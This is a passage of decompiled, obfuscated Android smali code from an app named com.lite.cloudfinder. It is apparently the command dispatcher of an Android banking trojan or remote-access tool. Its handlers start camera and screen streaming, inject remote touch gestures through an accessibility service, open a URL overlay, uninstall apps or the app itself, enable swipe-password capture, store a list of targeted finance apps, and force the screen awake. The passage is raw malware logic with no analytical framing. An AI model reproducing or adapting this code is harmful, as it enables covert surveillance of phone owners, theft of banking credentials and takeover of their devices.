    invoke-virtual {p1, v7, v8}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v8

    const-string v9, "width"

    const/16 v10, 0x280

    invoke-virtual {p1, v9, v10}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v10

    const-string v11, "zoom"

    invoke-virtual {p1, v11, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p1

    new-instance v1, Landroid/content/Intent;

    iget-object v12, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v13, Lcom/lite/cloudfinder/service/CameraService;

    invoke-direct {v1, v12, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {v1, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {v1, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {v1, v7, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {v1, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {v1, v11, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {v12, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method public final ډ(Lorg/json/JSONObject;)V
    .locals 4

    sget-boolean v0, Lcom/lite/cloudfinder/hd/HDStreamService;->ث:Z

    if-eqz v0, :cond_0

    const-string p1, "CommandDispatcher"

    const-string v0, "HD already running"

    invoke-static {p1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_0
    const/4 v0, 0x1

    sput-boolean v0, Lسۄھؤۏ۫/؋;->ص:Z

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v2, Lcom/lite/cloudfinder/hd/HDPermActivity;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v1, "width"

    const/16 v2, 0x1e0

    invoke-virtual {p1, v1, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v1, "height"

    const/16 v2, 0x356

    invoke-virtual {p1, v1, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v1, "quality"

    const/16 v2, 0x19

    invoke-virtual {p1, v1, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v3

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v1, "fps"

    invoke-virtual {p1, v1, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p1

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    iget-object p1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public final ڊ()V
    .locals 0

    invoke-virtual {p0}, Lڜٟٱڀ/أ;->ق()V

    return-void
.end method

.method public final ڌ()V
    .locals 4

    const/4 v0, 0x1

    sput-boolean v0, Lسۄھؤۏ۫/؋;->ا:Z

    sget v1, Lcom/lite/cloudfinder/service/WebRTCStreamService;->؋:I

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v3, Lcom/lite/cloudfinder/activity/ScreenCaptureActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v2, "webrtc"

    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public final ڍ()V
    .locals 3

    sget-object v0, Lcom/lite/cloudfinder/service/CameraService;->ت:Lcom/lite/cloudfinder/service/CameraService;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Lcom/lite/cloudfinder/service/CameraService;->؋()V

    :cond_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/lite/cloudfinder/service/CameraService;

    iget-object v2, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-direct {v0, v2, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v2, v0}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method public final ڎ()V
    .locals 3

    const/4 v0, 0x0

    sput-boolean v0, Lسۄھؤۏ۫/؋;->ص:Z

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v2, Lcom/lite/cloudfinder/hd/HDStreamService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "stop"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method public final ڑ()V
    .locals 3

    const/4 v0, 0x0

    sput-boolean v0, Lسۄھؤۏ۫/؋;->ا:Z

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v2, Lcom/lite/cloudfinder/service/WebRTCStreamService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "stop"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method public final ڒ(Z)V
    .locals 3

    const-string v0, "config"

    const/4 v1, 0x0

    iget-object v2, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {v2, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "swipePwdCapture"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "swipePwdScreen="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "CommandDispatcher"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public final ړ()V
    .locals 4

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v0, :cond_0

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1e

    if-lt v1, v2, :cond_0

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-static {v1}, Landroidx/core/view/accessibility/؋;->ا(Landroid/content/Context;)Ljava/util/concurrent/Executor;

    move-result-object v1

    new-instance v2, Lڜٟٱڀ/آ;

    const/4 v3, 0x0

    invoke-direct {v2, v3, p0}, Lڜٟٱڀ/آ;-><init>(ILjava/lang/Object;)V

    invoke-static {v0, v1, v2}, Landroidx/core/view/accessibility/أ;->خ(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Ljava/util/concurrent/Executor;Lڜٟٱڀ/آ;)V

    :cond_0
    return-void
.end method

.method public final ڔ(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "x"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v0

    const-string v2, "y"

    invoke-virtual {p1, v2, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p1

    new-instance v1, Landroid/graphics/Path;

    invoke-direct {v1}, Landroid/graphics/Path;-><init>()V

    iput-object v1, p0, Lڜٟٱڀ/أ;->إ:Landroid/graphics/Path;

    int-to-float v0, v0

    int-to-float p1, p1

    invoke-virtual {v1, v0, p1}, Landroid/graphics/Path;->moveTo(FF)V

    invoke-static {}, Landroid/os/SystemClock;->uptimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lڜٟٱڀ/أ;->ئ:J

    return-void
.end method

.method public final ڕ(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "x"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v0

    const-string v2, "y"

    invoke-virtual {p1, v2, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p1

    iget-object v1, p0, Lڜٟٱڀ/أ;->إ:Landroid/graphics/Path;

    if-eqz v1, :cond_0

    int-to-float v0, v0

    int-to-float p1, p1

    invoke-virtual {v1, v0, p1}, Landroid/graphics/Path;->lineTo(FF)V

    :cond_0
    return-void
.end method

.method public final ژ()V
    .locals 12

    iget-object v0, p0, Lڜٟٱڀ/أ;->إ:Landroid/graphics/Path;

    if-nez v0, :cond_0

    return-void

    :cond_0
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    const/4 v1, 0x0

    if-eqz v0, :cond_1

    invoke-static {}, Landroid/os/SystemClock;->uptimeMillis()J

    move-result-wide v2

    iget-wide v4, p0, Lڜٟٱڀ/أ;->ئ:J

    sub-long/2addr v2, v4

    const-wide/16 v4, 0x64

    invoke-static {v2, v3, v4, v5}, Ljava/lang/Math;->max(JJ)J

    move-result-wide v10

    new-instance v2, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    iget-object v7, p0, Lڜٟٱڀ/أ;->إ:Landroid/graphics/Path;

    const-wide/16 v8, 0x0

    move-object v6, v2

    invoke-direct/range {v6 .. v11}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    new-instance v3, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v3}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    invoke-virtual {v3, v2}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v3}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v2

    invoke-virtual {v0, v2, v1, v1}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    :cond_1
    iput-object v1, p0, Lڜٟٱڀ/أ;->إ:Landroid/graphics/Path;

    return-void
.end method

.method public final ڙ(Lorg/json/JSONObject;)V
    .locals 8

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "through"

    const-string v2, "fullscreen"

    const-string v3, "url"

    :try_start_0
    const-string v4, ""

    invoke-virtual {p1, v3, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {p1, v2, v5}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v6

    invoke-virtual {p1, v1, v5}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result p1

    new-instance v5, Landroid/content/Intent;

    const-class v7, Lcom/lite/cloudfinder/activity/OverlayActivity;

    invoke-direct {v5, v0, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v7, 0x10000000

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_0

    invoke-virtual {v5, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    :cond_0
    invoke-virtual {v5, v2, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    invoke-virtual {v5, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string v0, "CommandDispatcher"

    const-string v1, "transparent error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final ښ(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "package:"

    const-string v1, "pkg"

    const-string v2, ""

    invoke-virtual {p1, v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    :try_start_0
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.DELETE"

    invoke-virtual {v0, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    invoke-direct {v1, v2, p1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 p1, 0x10000000

    invoke-virtual {v1, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object p1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {p1, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string v0, "CommandDispatcher"

    const-string v1, "uninstallApk error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_0
    :goto_0
    return-void
.end method

.method public final ڛ()V
    .locals 5

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "package:"

    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.intent.action.DELETE"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {v2, v3, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v2, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "uninstallSelf error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final ڝ(Lorg/json/JSONObject;)V
    .locals 7

    const-string v0, "screenRule"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    if-nez v0, :cond_0

    const-string v1, "pageRuleList"

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->optJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v1

    if-eqz v1, :cond_0

    const-string v0, "data"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    :cond_0
    const/4 v1, 0x0

    if-eqz v0, :cond_4

    iput-object v0, p0, Lڜٟٱڀ/أ;->آ:Lorg/json/JSONArray;

    invoke-static {}, Lڜٟٱڀ/ة;->ء()Lڜٟٱڀ/ة;

    move-result-object v2

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v3

    if-nez v3, :cond_1

    monitor-enter v2

    :try_start_0
    iget-object v3, v2, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    invoke-virtual {v3}, Ljava/util/HashSet;->clear()V

    invoke-virtual {v2}, Lڜٟٱڀ/ة;->أ()V

    iput-boolean v1, v2, Lڜٟٱڀ/ة;->ؤ:Z

    const-string v3, ""

    iput-object v3, v2, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    const-string v3, ""

    iput-object v3, v2, Lڜٟٱڀ/ة;->ا:Ljava/lang/String;

    iput-boolean v1, v2, Lڜٟٱڀ/ة;->أ:Z

    iget-object v3, v2, Lڜٟٱڀ/ة;->ت:Landroid/os/Handler;

    new-instance v4, Lڜٟٱڀ/ئ;

    invoke-direct {v4, v2, v1}, Lڜٟٱڀ/ئ;-><init>(Lڜٟٱڀ/ة;I)V

    invoke-virtual {v3, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    monitor-exit v2

    goto :goto_1

    :catchall_0
    move-exception p1

    monitor-exit v2

    throw p1

    :cond_1
    move v3, v1

    :goto_0
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v4

    if-ge v3, v4, :cond_3

    invoke-virtual {v0, v3}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v4

    if-eqz v4, :cond_2

    const-string v5, "used"

    invoke-virtual {v4, v5, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v5

    if-eqz v5, :cond_2

    const-string v5, "pkg"

    const-string v6, ""

    invoke-virtual {v4, v5, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_2

    iget-object v5, v2, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    invoke-virtual {v5, v4}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2

    iget-object v5, v2, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    invoke-virtual {v5, v4}, Ljava/util/HashSet;->remove(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    invoke-virtual {v2}, Lڜٟٱڀ/ة;->أ()V

    iput-boolean v1, v2, Lڜٟٱڀ/ة;->ؤ:Z

    :cond_2
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_3
    :goto_1
    sget-object v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v2, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v2, :cond_4

    sput-object v0, Lسۄھؤۏ۫/؋;->خ:Lorg/json/JSONArray;

    :cond_4
    const-string v2, "financePackages"

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p1

    if-eqz p1, :cond_5

    invoke-virtual {p1}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-lez v2, :cond_5

    :try_start_1
    iget-object v2, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v3, "fin_pkgs"

    invoke-virtual {v2, v3, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "list"

    invoke-virtual {p1}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string v2, "CommandDispatcher"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "financePackages saved: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Lorg/json/JSONArray;->length()I

    move-result p1

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_5
    const-string p1, "CommandDispatcher"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "updatePageRule: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    if-eqz v0, :cond_6

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v1

    :cond_6
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " rules"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public final ڞ()V
    .locals 12

    const-string v0, "wakeup activity failed: "

    const-string v1, "wakeup WakeLock failed: "

    const-string v2, "wakeup accessibility method failed: "

    const-string v3, "wakeup reflection failed: "

    const-string v4, "CommandDispatcher"

    const-string v5, "handleWakeup called"

    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    iget-object v5, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v6, "power"

    invoke-virtual {v5, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/os/PowerManager;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    const/4 v6, 0x1

    :try_start_1
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v7

    const-string v8, "wakeUp"

    new-array v9, v6, [Ljava/lang/Class;

    sget-object v10, Ljava/lang/Long;->TYPE:Ljava/lang/Class;

    const/4 v11, 0x0

    aput-object v10, v9, v11

    invoke-virtual {v7, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v7

    new-array v8, v6, [Ljava/lang/Object;

    invoke-static {}, Landroid/os/SystemClock;->uptimeMillis()J

    move-result-wide v9

    invoke-static {v9, v10}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v9

    aput-object v9, v8, v11

    invoke-virtual {v7, v5, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "wakeup: PowerManager.wakeUp() success"

    invoke-static {v4, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v7

    :try_start_2
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v4, v3}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    :goto_0
    :try_start_3
    sget-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v3, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v3, :cond_0

    new-instance v7, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v8

    invoke-direct {v7, v8}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v8, Lڛڜڕڰڑ/ء;

    const/16 v9, 0xa

    invoke-direct {v8, v3, v9}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    invoke-virtual {v7, v8}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1

    :catch_1
    move-exception v3

    :try_start_4
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v4, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    :cond_0
    :goto_1
    const-wide/32 v2, 0xea60

    :try_start_5
    const-string v7, "BPkg:WakeScreen"

    const v8, 0x3000000a

    invoke-virtual {v5, v8, v7}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v7

    invoke-virtual {v7, v2, v3}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    const-string v7, "wakeup: WakeLock acquired"

    invoke-static {v4, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    goto :goto_2

    :catch_2
    move-exception v7

    :try_start_6
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

